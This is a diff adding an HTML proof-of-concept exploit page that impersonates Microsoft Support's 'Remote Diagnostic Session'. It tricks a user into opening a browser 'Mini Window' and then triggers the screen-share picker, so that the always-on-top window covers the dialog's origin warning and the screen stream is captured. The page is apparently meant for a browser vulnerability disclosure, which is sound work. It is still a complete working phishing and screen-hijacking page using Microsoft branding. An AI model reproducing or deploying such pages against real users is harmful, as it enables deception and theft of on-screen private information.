@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Microsoft Support - Remote Assistance</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Helvetica, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #2f2f2f;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        p {
+            color: #616161;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+        .btn {
+            background-color: #0067b8;
+            color: white;
+            padding: 10px 30px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: 600;
+            cursor: context-menu;
+            border: none;
+        }
+        #log {
+            margin-top: 20px;
+            padding: 15px;
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            display: none;
+            text-align: left;
+            font-size: 13px;
+            border-radius: 4px;
+        }
+        .video-container {
+            margin-top: 15px;
+            width: 100%;
+            background: #000;
+            border-radius: 4px;
+            overflow: hidden;
+            display: none;
+        }
+        video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Support" class="logo">
+    <h1>Remote Diagnostic Session</h1>
+    <p>A technical support agent is ready to assist you. To begin the secure diagnostic session, right-click the button below and select <b>"Open in Mini Window"</b> to launch the support interface.</p>
+    
+    <a id="share-trigger" class="btn" href="https://support.microsoft.com">
+        Start Diagnostic Session
+    </a>
+    <div id="log"></div>
+    <div class="video-container" id="vid-container">
+        <video id="stolen-screen" autoplay playsinline muted></video>
+    </div>
+</div>
+<script>
+    const trigger = document.getElementById('share-trigger');
+    const log = document.getElementById('log');
+    const video = document.getElementById('stolen-screen');
+    const vidContainer = document.getElementById('vid-container');
+    trigger.addEventListener('contextmenu', () => {
+        console.log("[PoC] Right-click detected. Waiting for Mini Window to open...");
+        
+        // Delay to allow user to click "Open in Mini Window"
+        // Once Mini Window is open, we trigger the Screen Share Picker natively
+        // The Mini Window (always-on-top) will cover the native dialog's origin warning text
+        setTimeout(async () => {
+            try {
+                // Trigger the Screen Share (Display Media) API
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { cursor: "always" },
+                    audio: false 
+                });
+                // If user selects a screen/window and clicks "Share"
+                video.srcObject = stream;
+                vidContainer.style.display = 'block';
+                log.style.display = 'block';
+                log.style.background = '#d4edda';
+                log.style.borderColor = '#c3e6cb';
+                log.style.color = '#155724';
+                
+                log.innerHTML = `
+                    <b>⚠️ SCREEN SHARE HIJACKED</b><br><br>
+                    <b>Impact:</b> The user was tricked into sharing their screen with a malicious background window. 
+                    The PiP/Mini Window successfully covered the "Origin" information in the native Screen Share chooser dialog, 
+                    making it look like a trusted diagnostic request from Microsoft Support.
+                `;
+                console.log("[PoC] SUCCESS: Screen stream established.");
+                // Automatically stop streams if user presses anywhere else eventually (for PoC safety)
+                stream.getVideoTracks()[0].onended = () => {
+                    log.innerHTML += "<br><br><i>Stream terminated by user.</i>";
+                };
+            } catch (err) {
+                log.style.display = 'block';
+                log.innerHTML = `<b>Cancelled:</b> User denied the screen share request or dismissed the hijacked dialog.`;
+                console.log("[PoC] Screen share cancelled or failed:", err.message);
+            }
+        }, 3500);
+    });
+</script>
+</body>
+</html>
